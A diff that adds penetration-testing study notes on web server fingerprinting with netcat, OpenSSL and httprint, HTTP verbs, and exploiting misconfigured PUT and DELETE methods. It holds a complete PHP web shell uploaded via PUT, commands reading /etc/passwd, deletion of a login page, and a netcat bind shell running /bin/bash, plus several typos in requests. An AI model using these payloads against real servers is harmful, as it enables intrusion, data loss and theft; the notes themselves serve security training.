@@ -1,0 +1,292 @@
+Web Server Fingerprinting 
+	
+	- misconfigured server is dangerous 
+	- fingerprinting: 
+		- daemon providing the webservice such as, IIS, apache, nginx...etc 
+		- its version 
+		- OS of the machine hosting the server 
+
+Fingerprint with "netcat"
+	
+	- netcat = TCP/IP swiss army knife 
+		- can be used for both the server and client 
+		- used to manually send requests to the server 
+
+	- banner grabbing 
+		- connect to a listening daemon -> read the banner it sends back to you client 
+
+	- connect to HTTP server 
+		- need the dist host + dest port 
+		- more often than not you will use port 80 (http)
+			- 1.  $ nc <target address> 80
+			- 2. send a valid HTTP request by using the "HEAD" HTTP verb
+				- requests the header of a resource (web page for example)
+				- * HTTP request has TWO EMPTY LINES between the header and the body of request
+				- * when sending body-less request like HEAD still need two empty lines 
+			- 3. netcat runs -> connects to server -> send the request message "HEAD / HTTP/1.0" and hit RETURN 2 TIMES 
+				- Ex. $ nc <target address> 80
+				# HEAD / HTTP/1.0 
+			- 4. target server will process the request and send back a "Server: " header containing information about the web server and sometimes the OS 
+
+	- common mistakes 
+		- write the request in UPPERCASE 
+		- netcat does not notify you after the connection to the server, must write the request after running the command 
+		- change behavior by using the "verbose switch (-v)"
+		- netcat does not perform any kind of encryption -> cannot use it to connect to HTTPS daemon -> connection will just drop 
+
+Fingerprint with OpenSSL 
+	
+	- web server only listens to HTTPS connections? 
+		- use OpenSSL command line tool 
+
+	- used to find various features of "OpenSSL SSL/TLS toolkit"
+	- connect to HTTPS service -> send standard HEAD request
+
+	- EX. $ openssl s_client -connect target.site:443
+	# HEAD / HTTP/1.0 
+
+Limits of Manual Fingerprinting 
+	
+	- Sys admins can customize web server banners -> difficult to penetrate 
+
+	- automatic tools go beyond banner grabbing 
+		- checking small implementation dependent details 
+			- headers ordering in response messages 
+			- errors handling 
+
+Fingerprint with Httprint 
+	
+	- Httprint = web server fingerprinting tool that uses "signature-based technique" to find web servers 
+
+	- $ httprint -P0 -h <target hosts> -s <signature file> 
+		- -P0 = avoid pinging the host (web servers dont usually respond to ICMP echo requests)
+		- -h <target hosts> = fingerprint a list of hosts. advised to use an IP address of the hosts you want to test. can also provide a range  of IP addresses
+		- -s = set the signature file to use 
+
+	- Ex. $ httprint -P0 -h 1.2.3.4 -s /usr/share/httprint/signatures.txt 
+
+
+HTTP Verbs 
+
+	- GET/POST/HEAD/PUT/DELETE
+
+	- GET 
+		- request a resource
+		- user wants to open a web page, browser sends a GET request 
+
+		- GET /page.php HTTP/1.1 
+		- Host: www.example.site
+
+		- can also pass arguements to the web app: 
+			- pass "course=PTS" to "page.php": 
+				- GET /page.php?course=PTS HTTP/1.0 
+
+
+	- POST 
+		- used to submit HTML form data
+		- POST parameters must be in the message body: 
+			- POST /login.php HTTP/1.0 
+			- Host: www.example.site 
+				(enter twice)
+			-username=john&password=mypass 
+
+	- HEAD 
+		- similar to GET as it just asks for header of response instead of body: 
+			- HEAD / HTTP/1.0 
+			- Host: www.example.site 
+
+	- PUT 
+		- used to UPLOAD a file to server
+		- very dangerous if the verb/action is allowed & misconfigured: 
+			- PUT /path/to/destination HTTP/1.1 
+			- Host: www.example.site 
+				(enter twice)
+			- <PUT data> 
+
+	- DELETE 
+		- used to REMOVE a file from a server 
+		- must be configured wisely as this can cause data loss or d.o.s: 
+			- DELETE /path/to/destination HTTP/1.0 
+			- Host: www.example.site 
+
+	- OPTIONS
+		- used to query the web server for enabled HTTP verbs: 
+			- OPTIONS / HTTP/1.O 
+			- Host: www.example.site 
+
+		- REST API 
+			- Representational State Transfer Application Programming Interface 
+			- specific type of web application that relies strongly on almost all of the HTTP verbs 
+			- typically referred to as "web services" or "API's"
+			- expect them to have subverted functionality 
+			- common for such applications to use "PUT" for saving data  not for saving files 
+
+			- before reporting that a "PUT/DELETE" method was found you should confirm it's impact twice 
+			- easy to confuse REST API's "PUT" method which creates new content with a standard "PUT" method that allows to create an arbitrary file 
+			- after issuing a "PUT" request you should try looking for the existence of the file you created 
+
+	- HTTP 1.0 vs 1.1 syntax 
+		- using / HTTP/1.0 = no host header is required 
+		- using / HTTP/1.0 = Host: header is required 
+
+Enumeration with OPTIONS 
+
+	- exploiting misconfigured HTTP verbs 
+
+	- Sending an OPTIONS message with Netcat 
+
+	$ nc victim.site 80 
+	OPTIONS / HTTP/1.0 
+		(enter twice)
+	HTTP/1.1 200 OK 
+	Date: Tue, 27 Jan 2015 13:30:56 GMT 
+	Server: Apache/2.2.22 (Debian)
+	Allow: GET,HEAD,POST,PUT,DELETE,OPTIONS
+	Vary: Accept-Encoding 
+	Content-Length: 0 
+	Connection: close 
+	Content-Type: text/html 
+
+Exploiting DELETE 
+	- all that has to be done is specify the file you want to DELETE from the server: 
+
+	$ DELETE /path/to/resource.txt HTTP/1.0
+		(enter twice)
+	HTTP/1.1 200 OK 
+	Date: Tue, 27 Jan 2015 13:37:19 GMT
+	Server: Apache/2.2.22 (Debian)
+	Vary: Accept-Encoding 
+	Connection: close 
+
+	- example of deleting the login page for users so no one can get in: 
+
+	$ DELETE /login.php HTTP/1.0
+		(enter twice)
+	HTTP/1.1 200 OK 
+	Date...
+	... close 
+
+Exploiting PUT 
+
+	- more complicated than DELETE 
+	- have to know the size of the file you want to upload to the server 
+	- can use the Unix utility "wc" (word count) with its "-m" parameter to count how long, in bytes, your payload is 
+
+	$ wc -m payload.php 
+	20 payload.php 
+
+	- use the size to build the PUT message 
+
+	$ nc victim.site 80 
+	PUT /payload.php HTTP/1.0
+	Content-type: text/html
+	Content-lenght: 20
+		(enter twice)
+	<?php phpinfo(): ?> 
+
+Uploading a PHP Shell with PUT 
+
+	- code a shell and upload to victim using "PUT"
+
+	<?php
+	if (isset($_GET['cmd'])) #runs the following code only if the GET "cmd" parameter is set 
+	{
+		$cmd = $_GET['cmd']; #reads the command to execute 
+		echo '<pre>'; 
+		$result = shell_exec($cmd); #runs the command by using the OS shell 
+		echo $result; #displays the output of the command 
+		echo '</pre>'; 
+	}
+	?> 
+
+	- can use it by passing your command via the cmd GET parameter 
+
+	$ nc victim.site 80 
+	PUT /shell.php?cmd=ls HTTP/1.0
+
+	- "victim.site/shell.php?cmd=ls"
+		- will list content of the current directory 
+
+	- shell has the same persons as the web server it runs on (write a file)
+		- "victim.site/shell.php?cmd=echo 'test string' > /tmp/testfile"
+			will print "test string" and store it in a text file called "testfile" in the /tmp directory
+
+	- can also read it 
+		- "victim.site/shell.php?cmd=cat /tmp/testfile"
+
+	- can read a system file 
+		- "victim.site/shell.php?cmd=cat /etc/passwd"
+
+	- * REMEMBER THAT "PUT" REQUIRES THAT WE PASS TEH CONTENT LENGTH 
+
+		- wc -m shell.php
+		136 shell.php 
+
+		- nc victim.site 80 
+		PUT /payload.php HTTP/1.0 
+		Content-type: text/html
+		Content-length: 136
+			(enter twice)
+		<?php
+		if (isset($_GET['cmd'])) #runs the following code only if the GET "cmd" parameter is set 
+		{
+			$cmd = $_GET['cmd']; #reads the command to execute 
+			echo '<pre>'; 
+			$result = shell_exec($cmd); #runs the command by using the OS shell 
+			echo $result; #displays the output of the command 
+			echo '</pre>'; 
+		}
+		?> 
+
+NETCAT VIDEO 
+
+	- which nc = invoke its location
+	- nc -h = help switch 
+	- start netcat server/listener
+		- nc -lvp 8888 #l = listener/v = verbosity/p = port selection
+	- connect to the server 
+		- nc -v 127.0.0.1 8888
+
+	- establish UDP connection 
+		- nc -lvp 9999
+	- connect to the server 
+		- nc -vu 127.0.0.1 9999 (-u = UDP connection)
+
+	- transfer data prepared earlier 
+		- nc -lvp 8888
+	- pipe to redirect 
+		- echo "hello" | nc -v 127.0.0.1 8888
+
+	- store the transfer data into a file with the listener 
+		- nc -lvp 8888 > received.txt 
+	- pipe the information to the listener 
+		- echo "hello" | nc -v 127.0.0.1
+
+	- send content through connection from inside one file and store it another 
+		- echo "hello" > tobesent.txt 
+	- connect to the network and store the sent information in a new fiel 
+		- nc -lvp 8888 > received.txt 
+	- sent the information 
+		- cat tobesent.txt | nc -v 127.0.0.1 8888
+		- it will be moved to received the txt 
+
+
+	- nc -e = executes after connection 
+		- listener is the server 
+			- nc -lvp 1227
+
+		- client is establishing the connection 
+			- nc -v 127.0.0.1 1227
+
+	- ESTABLISH A SHELL 
+
+		- set the listener 
+			- nc -lvp 1337 -e /bin/bash 
+
+		- set the connection on your machine 
+			- sudo nc -v 127.0.0.1 1337 (requires admin privileges)
+
+
+
+
+
